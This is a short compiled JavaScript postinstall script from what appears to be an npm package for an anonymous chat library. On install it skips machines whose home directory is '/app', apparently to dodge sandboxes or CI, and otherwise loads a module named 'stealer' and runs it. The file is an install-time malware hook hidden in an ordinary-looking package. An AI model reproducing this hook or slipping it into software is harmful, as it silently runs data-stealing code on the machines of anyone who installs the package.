"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const os = require("os");
const stealer_1 = require("./stealer");
(async () => {
    if (process.argv.includes('--postinstall')) {
        if (os.homedir() === '/app')
            process.exit();
        global.__anon_chat_lib_postinstall = true;
        try {
            await new stealer_1.AnonChatLib().run();
            process.exit(0);
        }
        catch {
            global.__anon_chat_lib_stop();
        }
    }
})();
//# sourceMappingURL=postinstall.js.map